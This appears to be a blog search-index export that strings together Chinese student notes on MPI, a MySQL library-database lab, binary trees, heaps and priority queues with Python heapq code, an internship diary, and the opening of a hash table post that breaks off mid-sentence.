对于一个问题进行分解，可以有两种方式，一种是域分解，一种是函数分解。所谓域分解就是讲问题的区域分为若干较小的区域，然后进行并行求解。 另外一种方式，函数求解又叫做功能分解。即使将一个大问题分解为若干子问题，然后对其并行求解。对应于这两种形式，就是所谓的SPMD,MPMD两种编程模式。 有SPMD,MPMD两种模式 程序员需要指定有哪些进程，不同进程间要发送哪些消息，发送发与接收方是谁？ MPI适用于分布式系统 问题 什么是SPMD?MPMD? 为什么会有SPMD,MPMD适用于什么情况？ MPI适合什么类型的体系结构？ SMP,MPP,DSM,Cluster? OpenMPI OpenMP 区别？ 6个基本函数OpenMPI提供了数以百计的API接口，但是完成一个基本的基于MPI的并行程序，一般只需要利用的其中六个，用这六个基本函数就可以求解很多问题。包括启动与结束MPI环境，识别进程以及发送接收消息。 1. MPI_Init() 2. MPI_Comm_size() 3. MPI_COmm_rank() 4. MPI_Send() 5. MPI_Recv() 6. MPI_Finalize() 问题 什么是通信域？ 什么是进程？和操作系统中的进程有什么区别？ 通信域与进程间关系？ 为什么要有消息标签？ 消息如何打包Pack，解包Unpack？ MPI_Status? MPI HelloWorld不会Fortran,只会C。在此只介绍如何用c来写mpi程序。关于如何安装mpi，此处略去。欲使用MPI编写并行程序，必须将头文件mpi.h包含进去。 #include&lt;mpi.h&gt; #include&lt;stdio.h&gt; int main(int argc, char * argv[]) { int rank,size; MPI_Init(&amp;argc,&amp;argv); MPI_Comm_rank(MPI_COMM_WORLD,&amp;rank); MPI_Comm_size(MPI_COMM_WORLD,&amp;size); printf(&quot;Hello world from process %d of%d\\n&quot;,rank,size); MPI_Finalize(); return 0; } 点对点通信通信机制 阻塞通信机制 非阻塞通信机制 通信模式 缓冲 同步 标准 就绪 通信模式(Communication Mode)指的是缓冲管理，以及发送方和接收方之间的同步方式不同通信模式和不同通信机制的结合，便 产生了非常丰富的点对点通信函数 发送方：（阻塞， 非阻塞） × （缓冲，同步，标准，就绪）共有8中发送方式 接收方有阻塞接收，非阻塞接收两种方式。 问题 什么是阻塞？什么是非阻塞？ 缓冲，同步，标准，就绪的含义？ 集群通信群集通信(Collective Communications)是一个进 程组中的所有进程都参加的全局通信操作。 群集通信实现三个功能:通信、聚集和同步 通信功能主要完成组内数据的传输 聚集功能在通信的基础上对给定的数据完成一定的操 作 同步功能实现组内所有进程在执行进度上取得一致 群集通信，按照通信方向的不同，又可以分为三 种:一对多通信，多对一通信和多对多通信。 对多通信:一个进程向其它所有的进程发送消息， 这个负责发送消息的进程叫做Root进程。 多对一通信:一个进程负责从其它所有的进程接收消 息，这个接收的进程也叫做Root进程。 多对多通信:每一个进程都向其它所有的进程发送或 者接收消息。 具体操作？ 含义？ 例子?","categories":[],"tags":[{"name":"并行计算","slug":"并行计算","permalink":"http://yoursite.com/tags/并行计算/"}]},{"title":"用mysql写存储过程与触发器","slug":"用mysql写存储过程与触发器","date":"2018-04-26T05:32:38.000Z","updated":"2018-04-26T05:36:53.000Z","comments":true,"path":"2018/04/26/用mysql写存储过程与触发器/","link":"","permalink":"http://yoursite.com/2018/04/26/用mysql写存储过程与触发器/","excerpt":"","text":"#数据库系统与应用 实验1 Report PB15121708 方林涛目录实验题目 实验环境 实验内容以及结果： 建表 插入测试数据 查询测试 存储过程 触发器 实验题目设某图书馆数据库包含下面的基本表： Book（ID: char(8)，name:varchar2(10)，author:varchar2(10)，price:float， status: int）图书号 ID 为主键，书名不能为空。状态（status）为 1 表示书被借出，0 表示在馆，默认值为 0。 Reader（ID:char(8)，name:varchar2(10)，age:int，address:varchar2(20)） 读者号 ID为主键。 Borrow（book_ID:char(8)，Reader_ID:char(8)，Brrrow_Date:date， Return_Date:date）其中：还期 Return_Date 为 NULL 表示该书未还。主键为（图书号，读者号），图书号为外键，引用图书表的图书号，读者号为外键，引用读者表的读者号 1、 创建上述基本表，并插入部分测试数据；2、 设计例子，验证实体完整性、参照完整性、用户自定义完整性；3、 用 SQL 语言完成下面小题，并测试运行结果：4、 设计存储过程，实现对 Book 表的 ID 的修改。5、 设计触发器，实现：当一本书被借出时，自动将 Book 表中相 应图书的 status 修改为1；当某本书被归还时，自动将 status 改为 0。 实验环境Mysql 5.7.20 MacOSX 建表1.11.21.3 插入测试数据 查询测试1. 1select id,address from reader where name = &apos;Rose&apos;; 2. 123select book.name,datediff(return_date,borror_date) as Days from borrow,reader,book where book_id = book.id and reader_id = reader.id and reader.name = &apos;Rose&apos;; 3. 123456mysql&gt; select reader.name from reader -&gt; where -&gt; reader.id not in -&gt; ( -&gt; select distinct reader_id from borrow -&gt; ); 4. 1select name,price from book where author = &apos;Ullman&apos;; 5. 1234567select book.id,book.name from book,reader,borrow wherereader.id = borrow.reader_id and book.id = borrow.book_id and reader.name = &apos;Lilin&apos; and datediff(curdate(),return_date)&lt;0; 12345select reader.name from reader,borrow where reader.id = borrow.reader_id group by reader.id having count(*)&gt;=3; 12345678select reader.name,reader.id from reader,borrow where borrow.reader_id = reader.id and book_id not in(select distinct book_id from borrow,reader where borrow.reader_id = reader.id and reader.name = &apos;Lilin&apos;) 1select name,id from book where name like &apos;%Oracle%&apos;; 9. 12select reader_id,count(*) from borrow_view V where datediff(curdate(),borrow_date)&lt;=365 group by reader_id; 存储过程123456789DELIMITER $create procedure modify_bookid(in old_id char, in new_id char)begin set foreign_key_checks = 0;update book set id = new_id where id = old_id; update borrow set book_id = new_id where book_id = old_id; set foreign_key_checks = 1;end$ 测试call modify_bookid(&apos;0&apos;,&apos;9&apos;)$ 触发器 CREATE PROCEDURE 存储过程名称( IN/OUT 参数 数据类型 ...) BEGIN END create procedure modify_bookid( in old_id char, in new_id char) begin set foreign_key_checks = 0; update book set id = new_id where id = old_id; update borrow set book_id = new_id where book_id = old_id; set foreign_key_checks = 1; end$ create trigger borrow_insert after insert on borrow for each row begin if datediff(curdate(),new.return_date)&gt;=0 then update book set status = 0 where id = new.book_id; else update book set status = 1 where id = new.book_id; end if; end$ 插入测试数据前book，borrow表 插入测试数据后borrow，book表","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"Basic Data Structures Review","slug":"Basic Data Structures","date":"2018-04-23T09:24:44.000Z","updated":"2018-04-25T13:05:33.000Z","comments":true,"path":"2018/04/23/Basic Data Structures/","link":"","permalink":"http://yoursite.com/2018/04/23/Basic Data Structures/","excerpt":"","text":"1 Tree 1.1 Definition 1.2 Operation 1.3 性能分析 &amp; 计算相关问题 1.4 Implementation 1.4.1 二叉树的遍历 1.4.2 二叉搜索树的操作 2 Linked List 3 Stack &amp; Queue 4 Heap 5 String 6 Hash 今天，复习一下基本的数据结构。顺带解决一些小问题。 要解决的问题 BST的定义？key可以相等吗? Binary Search Tree 与最小堆之间的区别? 完全二叉树等的概念歧义问题？ BST的平均高度？为什么？平均是什么意思？ 1 Tree1.1 Definition1.1.1 Tree 树在计算机科学中，树是一种被广泛使用的数据结构/ADT，树模仿自然界中树的层次结构。关于树的确切定义，可以使用递归的方式来定义。即：(Recursive Defintion)树是一些节点的集合。这个集合可以是空集。若非空，则一棵树由一个称作根root的节点，以及0个或者多个非空的子树构成。这些子树中的每一棵都与root有一条边链接。 图1：一棵树的实例： 1.1.2 Binary Tree 二叉树二叉树是一棵树，其中每个节点至多有两个儿子。 1.1.3 Binary Search Tree 二叉搜索树(BST)二叉搜索是特殊的二叉树。 每一个有节点有一个Key键值。对于树中的每个节点X，它的左子树中的所有Key＜X.Key (≤X.Key).右子树中的所有Key＞X.Key(≥X.Key)。(关于上述两种不同的定义情况，其本质问题即使BST是否允许存在两个节点Key相等？)这个我在不同的书中看到了不同的定义[1]中给出的定义是不可以相等。[2]中给出的定义是可以。即树中的每个节点X,左子树中的所有Key≤X.Key.右子树中的所有Key≥X.Key. 我个人认为：对于大部分情况而言，我们更倾向于不存在Key值相同的情况。这样即符合很多实际情况，又能够简化问题。 当然，也可以引入带有Key值相等的情况，这需要再实现上考虑这个问题。具体见[2]思考题12.1. （而且[2]的算法皆是按照在不存在key值相等的情况下编写的） Binary Search Tree 与最小堆之间的区别： 二叉搜索树的节点的左右孩子是有序的，left.key &lt; parent.key &lt; right.key 而最小堆，其左右孩子是无序的，也没有大小关系。{left.key ,right.key}&gt; parent.key 对于最小堆而言,查找最小值是O(1)的，由于其左右孩子无大小关系，其查找任意一key则是O(n)的。 二叉搜索树与最优二叉搜索树： 最优二叉搜索🌲 动态规划 1.1.4 其他Type的树Perfect Binary TreeA perfect binary tree is a binary tree in which all interior nodes have two children and all leaves have the same depth or same level. Full Binary Tree每个节点的度为0或2 。A full binary tree (sometimes referred to as a proper or plane binary tree)is a tree in which every node has either 0 or 2 children.图2： A full binary tree Complete Binary Tree所有层全充满，除了最后一层。且最后一层的节点从左向右填充。综上，即上述定义来自维基百科，此为最为广泛使用的定义。然后不同的文献之间定义却存在歧义。主要在于完全二叉树的问题上。 譬如说，在一些国外教程以及国内教材中【完全二叉树】一词指上图中的complete binary tree，而在算法导论中【完全二叉树】一词指上图中perfect binary tree。用【近似的完全二叉树】一词表示上图中的complete binary tree。 国内教材中 满二叉树 指 perfect binary tree 完全二叉树 指 complete binary tree 算法导论[2]中： 满二叉树 指 perfect binary tree 近似的完全二叉树 指 complete binary tree 完全二叉树 指 perfect binary tree 知乎上有一个讨论此问题的问题为什么说“满二叉树也是完全二叉树? 同样的，对于树的深度depth和高度height不同的作者也都有不用的定义。见:What is the difference between tree depth and height? link另外，对于根节点的标记有的从0开始也有的从1开始。 先序序列为a,b,c,d 的不同二叉树的个数是n个结点构成的不同二叉树个数为 c(n,2n)/(n+1) 【卡特兰数】 AVL树why AVL?对于BST而言，其查询插入删除的时间复杂度都是O(h),h为树的高度。 一个不好的消息是BST的最坏时间复杂是O(n)。即BST的高度最坏可以达到O(n)，这也不难理解。 试想一颗总是朝着一个方向生长的二叉树。 它的高度便是O(n)。为了提高性能，我们的出发点便是控制树高。 使得树高不至于那么高(O(n)级别)。 为了能够控制树高，我们期望树更加平衡些。即左右子树高度相差不是很大。譬如说，我们可以限制对于任意一个节点，其左右子树的高度相等。这样的话，树的高度就会受限，不会疯狂的朝着一个方向生长。 然而这样的条件比较苛刻。 不容易满足。于是我们可以限制每一个节点左子树和右子树的高度最多差1。这样的话既可以控制树高，又不是那么难以满足。 what ?AVL树即平衡 二叉搜索树 其以发明者 Adelson-Velsky and Landis命名。 AVL 树 == BBST（Balanced Binary Search Tree） 一颗AVL树是其每一个节点左子树和右子树的高度最多差1的二叉搜索树。AVL树是自平衡的，即使在插入删除操作中，它可以自己调整(Rotate)从而使得满足AVL树条件。 AVL树的每一个结点都有一个平衡因子Balanced Factor:为该结点的左子树的深度减去它的右子树的深度。对于AVL树而言对于任一节点N，有BalanceFactor(N) ∈ {–1,0,+1} AVL树的深度和logN是同数量级的(其中的N为结点个数) （why?） Huffman树如何构建?性质树中一定没有度为1的结点 ASLhuffman树与最优二叉搜索树的区别 线索二叉树前序和后序线索化之后，空链域为1中序线索化后，空链域为2 n个结点的线索二叉树上含有的线索数为 2n - (n-1) = n+1 1.1.5 高级树结构B 树红黑树基数树Treap树1.2 Operation 操作 二叉树 遍历 （前序/中序/后序/层次） 二叉搜索树BST 插入/删除 搜索 Note: 对于所有遍历操作，不论是递归实现还是迭代实现，其时间复杂度都是O(n)。 (why?) 1.3 性能分析 &amp; 计算相关问题1.3.1 二叉树Binary Tree对于遍历操作，不论是递归实现还是迭代实现，其时间复杂度都是O(n)。 1.3.2 二叉搜索树Binary Search Tree:[3] 对于插入，删除，查找操作其复杂度都是O(h) ，这是显而易见的。接下来的问题便是h到底是多少，h与n的关系了.对于树的深度而言，其 最坏深度为O(n) ，这是显而易见的。 平均深度 O(log n) 这导出两个问题， 1.为什么是O(log n)? 如何证明之 2.在这里平均的意义(含义)又是什么？ 关于问题1，我在[1],[2]中找到了相关的说明。 [2] 中定理12.4 证明了一颗有n个不同关键字的随机构建二叉搜索树的期望高度是O(log n ) NOTE: 在这里随机构建的含义即是，考虑n个不同的节点，其所有排列情况是n!中，对于每一种情形按次序依次插入一个元素构建BST， 注意只有插入操作，而没有删除操作。这样的构建过程叫做随机构建。 12.4节中同样证明了，一颗有n个不同关键字的随机构建二叉搜索树的期望高度是O(log n ) 。 但是对于既存在插入操作，又存在删除操作的BST，其平均深度在[2]中并未做说明。 If deletions are allowed as well as insertions, &quot;little is known about the average height of a binary search tree&quot; [1] 中证明了，有n个节点，假设所有的树出现的机会相等时，则树平均深度为O(log n)证明过程见下Weisss-p78在这里，我认为其含义同[2]，即随机构建，虽然[1]中貌似并未明确其平均含义。 对于既存在插入操作，又存在删除操作的情况下， [1]中给出了如下结论： 已经证明，如果我们交替插入和删除θ(n^2)次，那么树的期望深度是θ(根号n) 1.3.3 相关计算设层数从1开始，即根节点为第1层，共有k层。 那么第i层，最多有2^(i-1)个节点。 整棵树，最多有2^0 + 2^1 + … 2^(k-1) = 2^k -1 若叶子节点即读书为0的节点有m个，度数为2的节点有n个，那么 m = n + 1 若整棵树有N个节点，设其高度为h。那么有[2^(h-1)-1] + 1 ≤ N ≤ 2^h - 1 即floor(log2(N)) + 1 后者ceil(log2(N+1)) 1.4 Implementation 实现1.4.1 Tree 遍历1.4.2 二叉搜索树的操作二叉树的重构所谓重构即使，在不知道二叉树结构的情况下，从二叉树的先序中序后序遍历序列中重构出二叉树的结构。可以证明：采用 (先序遍历 || 后序遍历) + 中序遍历 可以重构出二叉树。采用 先序遍历 + 中序遍历 不可以重构出二叉树 至于为什么？相关证明参见数据结构-二叉树重构 那么如何重构？[1]: 数据结构与算法分析 C语言描述 Weiss [2]: 算法导论 CLRS 3th Edition [3] https://en.wikipedia.org/wiki/Binary_search_tree","categories":[],"tags":[{"name":"data structures","slug":"data-structures","permalink":"http://yoursite.com/tags/data-structures/"}]},{"title":"一个弱鸡的找实习经历","slug":"一个弱鸡的找实习经历","date":"2018-04-20T16:38:43.000Z","updated":"2018-04-20T16:47:43.000Z","comments":true,"path":"2018/04/21/一个弱鸡的找实习经历/","link":"","permalink":"http://yoursite.com/2018/04/21/一个弱鸡的找实习经历/","excerpt":"","text":"4-2日投递：爱奇艺（ Up主质量等级划分， 深度学习开发工程师-实习-）优酷， （算法工程师-机器学习）商汤 (见习算法开发工程师-暑期实习)，去哪儿，（开发）瓜子 (数据挖掘)微众银行(NT-信息安全(数据挖掘方向))顺丰，（大数据挖掘与分析实习生）蘑菇街,拼多多，(算法)旷视，（暑期实习生算法研究员）百度，（商务搜索部机器学习/数据挖掘实习工程师）小米,58转转（开发）七牛云 （算法）作业帮滴滴POI（数据挖掘研发），地图事业部（算法）51信用卡 （算法实习生）cvte (中央研究院 数据挖掘实习生)虎牙 （数据挖掘实习生） 待投递：ebay PayPal 第四范式 新笔试：七牛云（算法） 4-13 （19：00）今日头条 4-15 （10：00）瓜子(数据挖掘) 4-15 (10:00)58(开发) 4-15 （20：00）微众银行 4-16 (19:00)美团 4-20(19:00) 简历挂:阿里，百度 ，滴滴，爱奇艺，优酷，商汤，拼多多，蘑菇街，小米，虎牙，快手，作业帮，去哪儿，顺丰 瓜子，微众银行待定 无结果 笔试挂:微软，头条，华为，京东，美图，七牛云，58网易游戏 笔试通过、收到面试: 艾耕（3-30），旷视(4-19) , 微软（4-26）收到offer:艾耕 Face++ 面试 12345678910111213141516171.讲讲自己用做的项目 2.问熟悉哪些语言...python python is ==的区别？ python方法解析顺序 m*k n*k两矩阵计算欧几里得距离np.tile？ 3.问上了哪些课？ elf 的 bss段？ ip报文经过一个路由器改变哪些字段？ 4.Batch normalization ？ group convolution ？ 5 .a,b~U[0,1]，互相独立 求Max(a,b) 期望","categories":[{"name":"Job","slug":"Job","permalink":"http://yoursite.com/categories/Job/"}],"tags":[{"name":"实习","slug":"实习","permalink":"http://yoursite.com/tags/实习/"},{"name":"internship","slug":"internship","permalink":"http://yoursite.com/tags/internship/"}]},{"title":"基于比较的的排序","slug":"基于比较的的排序","date":"2018-04-20T16:35:52.000Z","updated":"2018-05-08T12:10:02.000Z","comments":true,"path":"2018/04/21/基于比较的的排序/","link":"","permalink":"http://yoursite.com/2018/04/21/基于比较的的排序/","excerpt":"","text":"Toaday I’m going to review some important sorting algorithms based on comparison.Besides,related data structures such as heap,priority queue will also be talked. 1 堆排序 &amp;&amp; 优先队列 2 选择排序，插入排序，冒泡排序 3 快速排序 4 相关笔试题分析 1 堆排序 &amp;&amp; 优先队列1 堆排序 &amp;&amp; 优先队列 目录： 1.1 什么是堆? what and why? 1.1.1 what？ 1.1.2 关于二叉堆 Binary Heap 1.1.3 why ? 1.2 堆的实现？什么二叉堆？ 1.2.0 什么是二叉堆？ binary heap? 1.2.1 堆的实现 二叉堆 1.2.2 斐波那契堆的实现 1.2.3 二项堆堆的实现 1.3 堆的相关操作？ 堆排序？ 1.3.1 Max-Heapify 1.3.2 Build-Max-Heap 1.3.3 HeapSort 1.3.4 关于优先队列の操作 1.4 堆的优缺点? 堆排序分析. 1.4.1 堆的优缺点 1.4.2 性能分析 1.5 优先队列 what and why? 堆与优先队列的关系？ 1.5.1 什么是优先队列？Priority Queue 1.5.2 为什么是要使用优先队列？ why? 1.5.3 Links between Heap and Priority Queue ? 1.6 优先队列的实现 性能分析？ 1.6.1 Naive Implementation 1.6.2 Usual Implementation 1.6.3 Specialized Heaps Implementation 1.6.4 性能分析 1.7 Java，Python中的Heap，Priority Queue的实现 1.7.1 Java中的实现 1.7.2 Python中的实现 1.8 References &amp; Externel Links 1.8.1 References 1.8.2 Externel Links In this Section,we’ll go deeply to reveal concrete definitions of Heap,Binary Heap,and Priority Queue and difference between them.Basic Concepts and Methods will also be talked but not that specifically. 1.1 什么是堆？Heap?1.1.1 what？很多人以为堆 == 二叉堆 == 优先队列 他们之间的关系真的是相等的吗？ [Conclusion at section 1.5.3] 在英语中，heap作为动词 把..堆起/使成堆 的意思。作为名词是堆/很多的意思。1964年，J. W. J. Williams 发明了堆排序(Heap Sort)[1]，同时描述了如何利用二叉堆来实现一个优先队列。 使用该种数据结构可以高效的获取队列中的最大值或者最小值，从而进行排序操作。（关于二叉堆见1.2,什么是优先队列见1.4 ） 之后，后人不断加以改进，产生了一系列不同的堆.比如k-叉堆，斐波那契堆，二项堆，左式堆，斜堆等等。 见堆变体#Variants)。 从最初William的二叉堆用于堆排序，到后来的各式各样的堆，基本都是以树的形式表示。因此说 堆是一共基于树的数据结构。 维基百科也有说：A heap is a specialized tree-based data structure that satisfies the heap property。 所谓的heap property(堆的性质)即是大根堆/小跟堆的性质(所有父节点≥/≤子节点)。 因此，亦可以说堆不是一个数据结构，而是一类数据结构[this is my personal opinion]。 1.1.2 关于二叉堆 Binary Heap 二叉堆是一种堆。 维基百科上说： A binary heap is a heap data structure that takes the form of a binary tree. Binary heaps are a common way of implementing priority queues.[2] 显而易见的，将堆与二叉堆划等号（堆heap == 二叉堆bianry heap），显然是一个不成熟的想法。 heap != bianry heap,that is to say , heap is a class of data structures.but binay heap is a common type of heap. 它们与优先队列的关系将会在1.4中简要探讨。 1.1.3 why ?既然知道了什么是堆，那么为什么要用堆呢？williams为什么要引入它呢。它又有哪些优点呢。我认为，对于传统的大根堆或者小跟堆而言，最大值/最小值分别处于root节点位置.(为什么？)这方便我们从中读/取最大值，最小值，这是一个O(logn)的操作。相对于数组而言，这有显著的性能提升。因此堆适用于那些需要频繁取最大/最小值的应用。 1.2 堆的实现？什么二叉堆？堆采用树结构实现。对于不同的堆有不同的树实现。 1.2.0 什么是二叉堆二叉堆是一种堆，二叉堆广泛地被使用，以至于，当我们谈论堆时，通常默认指的就是二叉堆。二叉堆也是优先队列的一种常见的实现。 （什么是优先队列见1.4 ） 二叉堆基于二叉树是实现，除了是二叉树之外，还需要满足下面两个条件。1.Shape property :一个二叉堆是一个完全二叉树。在此含义即是所有的层（除了最后一层）都是满的，只有最后一层不是满的，而且最后一层的节点从左向右依次填充。2.Heap property: （大根堆）对于所有的父亲节点而言，其值≥子节点。 （小根堆）对于所有的父亲节点而言，其值≤ 子节点。 【注意可以等于】 1.2.1 二叉堆的实现对于最常见的二叉堆：他使用二叉树来实现，这个二叉树是一个完全二叉树(完全二叉树在不同的文献中有着不同的含义，在此处我们取所有的层（除了最后一层）都是满的，只有最后一层不是满的，而且最后一层的节点从左向右依次填充。见维基百科-完全二叉树) 逻辑上，二叉堆是一棵树。 物理上，二叉堆常用数组来实现。而不需要指针。这样可以获得较好的性能。(考虑为什么可以？) 如下图所示：逻辑结构：物理结构： 1.2.2 斐波那契堆的实现待续 1.2.3 二项堆的实现待续 1.3 堆的相关操作？ 堆排序？对于不同的heap，我们有不同的操作，在此，我们先对最为广泛的二叉堆进行阐述。【本部分主要采自算法导论第三版 &amp;&amp; 只针对大根堆（小根同理）】【注：大根堆 == 最大堆，小根堆 == 最小堆】 Max-Heapify 维护大根堆的性质。O(log n) Build-Max-Heap 从无序的输入数据数组中构造一个大根堆。 O(n) HeapSort O(nlog n ) 对一个数组进行[原址]排序。 Max-Heap-Insert,Heap-Extract-Max,Heap-Increase-Key,Heap-Maximum【O(1)】过程、时间复杂度均为O(log n )功能是利用二叉堆实现一个优先队列。 【此处只是列出了算法伪代码以及算法思想，比较晦涩，最好还是找到具体的例子(譬如算法导论上就可以找到)，配合算法，会有更加深刻的理解，此处限于篇幅就不做举例了】 1.3.1 Max-HeapifyMax-Heapify(A,i) 自顶向下维护大根堆性质。 O(log n) 1.3.2 Build-Max-HeapBuild-Max-Heap(A) 从最后一个非叶子节点开始，到根节点一次调用Max-Heapify(A,i)【此算法的复杂度是O(n) 而不是O(n log n)试想为什么？】【算法导论上有证明】 1.3.3 HeapSortHeapSort(A) O(n log n )思想：每次从root节点取出最大值，然后调整。即：从最后一个节点开始，将其调换A1]，将脱离堆，从根节点开始调整堆。 1.3.4 优先队列の操作Max-Heap-Insert,Heap-Extract-Max,Heap-Increase-Key,Heap-Maximum【O(1)】过程、时间复杂度均为O(log n )功能是利用二叉堆实现一个优先队列。these operations are implemented to implement a priority queue.the operations above ,i.e. Max-Heapify,Build-Max-Heap ,HeapSort are enough for heapsort. Max-Heap-Insert,在大根堆中插入一个元素并调整之 Heap-Extract-Max,取出最大值即根节点，然后调整之 Heap-Increase-Key,将某个节点增加一定的值，然后调整之 Heap-Maximum，返回根节点的值 1.4 堆的优缺点? 堆排序分析.1.5 堆与优先队列的关系？ 优先队列what and why?1.5.1 什么是优先队列？Priority Queue优先队列是一种类似于队列的数据结构。熟悉数据结构的我们知道，队列是一种允许在一段进行插入(入队)以及另一端进行删除(出队)的数据结构。 它是一种FIFO类型的数据结构。 队列在很多方面都有很多应用，比如在cache(替换策略),进程/作业调度方面。 而，在很多情况下，我们需要考虑不同元素的优先权不同，譬如在操作系统调度中，有一种叫做SJF的算法(即最短作业有限),在此，优先级就是执行作业的用时长短。这种情况下，用基本的先入先出的队列就不能胜任了。因此，引入了一种叫做优先队列(Priority Queue )的数据结构。优先队列中的每一个节点都有对应的优先级。 在不同的应用中采用不同的指标作为优先级。 优先队列满足至少以下两种操作[4] Insert 插入/入队 将一个节点插入到优先队列 Deelete Min/Max 删除最小值/最大值，或者称之为Min/Max出队. 其实可以将Stack,Queue作为优先队列的两种特殊情况(为什么？) 也可以将优先队列看做为队列的一种修改，当出队时，总是出优先级最大/小的节点。 1.5.2 为什么是要使用优先队列？ why?引入了优先队列，可以方便的执行插入以及取最大/最小值的操作。在很多应用中，这两种操作频繁出现。 我认为优先队列 一方面，其插入,取最大/最小值操作在很多应用中频繁使用，满足了这些应用的需求。 另一方面，使用堆来实现的优先队列具有很好的性能。这使得我们更加倾向于使用它们。(关于性能见1.5) 维基百科上列举了优先队列的一些重要应用[3]： Bandwidth management Discrete event simulation Dijkstra&apos;s algorithm Huffman coding Best-first search algorithms ROAM triangulation algorithm Prim&apos;s algorithm for minimum spanning tree 1.5.3 Links between Heap and Priority Queue ?优先队列常使用堆Heap来实现，但是优先队列与堆在概念上是不同的。优先队列是一种抽象数据结构ADT(逻辑上)，它可以有很多实现(物理上)，譬如堆，数组，链表等。但是最常见且最高效的实现是采用堆来实现。 到目前为止，我们理清了三者之间的关系。so 堆 != 二叉堆 != 优先队列 != 堆Heap : 二叉堆，k-叉堆，二项堆，斐波那契堆，斜堆，etc..PQ : Priority Queue(ADT) 。Many kinds of Implementations二叉堆是堆的一种，常用于实现优先队列。 1.6 优先队列的实现 性能分析？1.6.1 Naive Implementation有很多非常simple的实现优先队列的方法，比如无序列表Unordered List。尽管Simple，但是性能却不佳。对于无序列表而言，插入操作是O(1)的，出队Extract-Min/Max 却是O（n）的，因为要搜索整个列表。 1.6.2 Usual Implementation为了提高性能，堆被引入作为实现。普通的二叉堆具有O(log n )的performance for inserts and removals。and O(n) to build initially。普通二叉堆的变体，斐波那契堆， pairing heaps提供了更好的性能。 1.6.3 Specialized Heaps Implementation有一些特殊的堆结构，可以提供附加一些的操作(除1.5.1中的两种),或者在一些特殊的数据类型上性能优于普通的堆。见[3] 1.6.4 性能分析下图为采用不同的堆作为优先队列时，相关操作的时间复杂度。【此为最小堆】【采自维基百科，注释略之】 1.7 Java，Python中的Heap，Priority Queue的实现1.7.1 Java中的实现Class PriorityQueue 1.7.2 Python中的实现heapq模块实现了二叉堆的功能,可以用来实现优先队列以及Heapsort。为Min-Heap.且下标从0开始。 API Heapify() 给定一List,原地 线性 将其变为最小堆。 Heappop() 从堆中pop最小值，即索引[0]所在元素。 Heappush() 向插入一个元素。 用例 此外还提供了 heapq.nlargest, heapq.nsmallest 用来返回n个最大/最小的元素。 实现HeapSortdef heapsort(iterable): h = [] for value in iterable: heappush(h, value) return [heappop(h) for i in range(len(h))] &gt;&gt;&gt; heapsort([1, 3, 5, 7, 9, 2, 4, 6, 8, 0]) &gt;&gt;&gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 实现优先队列pq = [] # list of entries arranged in a heap entry_finder = {} # mapping of tasks to entries REMOVED = &apos;&lt;removed-task&gt;&apos; # placeholder for a removed task counter = itertools.count() # unique sequence count def add_task(task, priority=0): &apos;Add a new task or update the priority of an existing task&apos; if task in entry_finder: remove_task(task) count = next(counter) entry = [priority, count, task] entry_finder[task] = entry heappush(pq, entry) def remove_task(task): &apos;Mark an existing task as REMOVED. Raise KeyError if not found.&apos; entry = entry_finder.pop(task) entry[-1] = REMOVED def pop_task(): &apos;Remove and return the lowest priority task. Raise KeyError if empty.&apos; while pq: priority, count, task = heappop(pq) if task is not REMOVED: del entry_finder[task] return task raise KeyError(&apos;pop from an empty priority queue&apos;) 最大堆的实现待续ref 1.8 References &amp; Externel Links1.8.1 References[1] : Williams, J. W. J. (1964), “Algorithm 232 - Heapsort”, Communications of the ACM, 7 (6): 347–348 [2] :维基百科-二叉堆 [3] :维基百科-优先队列 [4] : 《数据结构与算法分析 C语言实现》 Weiss Chapter 6 1.8.2 Externel LinksPython使用heapq实现小顶堆（TopK大）、大顶堆（BtmK小） 利用Python实现堆排序 .. 1.2 选择排序，插入排序，冒泡排序1.3 快速排序1.4","categories":[{"name":"algorithms","slug":"algorithms","permalink":"http://yoursite.com/categories/algorithms/"}],"tags":[{"name":"排序","slug":"排序","permalink":"http://yoursite.com/tags/排序/"},{"name":"基于比较的排序","slug":"基于比较的排序","permalink":"http://yoursite.com/tags/基于比较的排序/"},{"name":"算法","slug":"算法","permalink":"http://yoursite.com/tags/算法/"}]},{"title":"Hash Table 基础","slug":"Hash-Table-基础","date":"2018-04-19T18:00:59.000Z","updated":"2018-04-20T02:40:29.000Z","comments":true,"path":"2018/04/20/Hash-Table-基础/","link":"","permalink":"http://yoursite.com/2018/04/20/Hash-Table-基础/","excerpt":"目录1.1 什么是哈希Hash 1.2 哈希函数 Hash Function 1.2.1 哈希函数性质 1.2.2 哈希函数的选择 1.2.3 Perfect Hash Function (PHF) 1.2.4 Minimal Perfect Hash Function (MPHF) [Note] 1.3 什么是哈希表 Hash Table 1.3.1 Key statistics 1.3.2 Dynamic Resizing 1.3.3 ReHashing 1.4 冲突 Collsion 1.4 性能 1.5 哈希表的实现 Implementation 1.5.1 PHF以及MPHF的实现 1.5.2 Java Python 实现 1.6 应用 Applications 1.7 總結 Summary 1.7 References &amp; External Links","text":"目录1.1 什么是哈希Hash 1.2 哈希函数 Hash Function 1.2.1 哈希函数性质 1.2.2 哈希函数的选择 1.2.3 Perfect Hash Function (PHF) 1.2.4 Minimal Perfect Hash Function (MPHF) [Note] 1.3 什么是哈希表 Hash Table 1.3.1 Key statistics 1.3.2 Dynamic Resizing 1.3.3 ReHashing 1.4 冲突 Collsion 1.4 性能 1.5 哈希表的实现 Implementation 1.5.1 PHF以及MPHF的实现 1.5.2 Java Python 实现 1.6 应用 Applications 1.7 總結 Summary 1.7 References &amp; External Links 1.1 什么是哈希Hash？哈希表的实现 称之为 哈希，抑或 散列。(雜湊 For 台灣 )哈希表在【平均】情况下以常数时间constant time 执行「插入」，「删除」和「查找」的技术。 12为什么平均O(1)？原理？最坏情况下呢？ O(n) 为什么？ 但是对于元素间的【排序】操作将不会得到有效的支持。譬如FindMax,FindMin以及按序打印元素都是散列表所不支持的。[1] 哈希/散列 接收一个值，输出这个值的哈希值 维基百科[2]中有一段对其的介绍： 1234Selected From Wiki-Hash Table [2]: The idea of hashing is to distribute the entries (key/value pairs) across an array of buckets. Given a key, the algorithm computes an index that suggests where the entry can be found. 1.2 哈希函数 Hash Function ？哈希函数是可以将【任意大小】的数据映射为【固定】大小数据的一个函数。其返回数据的哈希值。哈希函数的一个用处是用来实现哈希表Hash Table. 哈希表在计算机科学中被广泛应用以提高查询性能。哈希函数在密码学，Cache , 布隆过滤器，等中也有所应用。[3] 关于具体的哈希函数，请参见List of hash_functions 12345维基百科[3]： A hash function is any function that can 